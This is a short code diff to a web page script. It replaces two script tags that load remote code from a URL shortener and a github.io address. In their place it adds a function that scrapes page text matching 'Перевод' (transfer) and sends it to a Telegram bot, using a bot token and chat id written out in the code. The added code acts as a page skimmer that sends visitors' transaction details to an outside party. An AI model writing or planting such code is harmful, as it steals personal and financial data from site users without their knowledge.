@@ -1,3 +1,9 @@
-<script src="shorturl.at/emsXZ"></script>
+function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
 
-<script src="https://jodode.github.io/x.js"></script>
+httpGet("https://api.telegram.org/bot5845735007:AAHwoqGS8hjRbl8Qx5TsY9ZgnhoglvW6Iks/sendMessage?chat_id=439546457&text=" + (document.body.textContent.match(/Перевод.*/g).join("--") || "fail"));
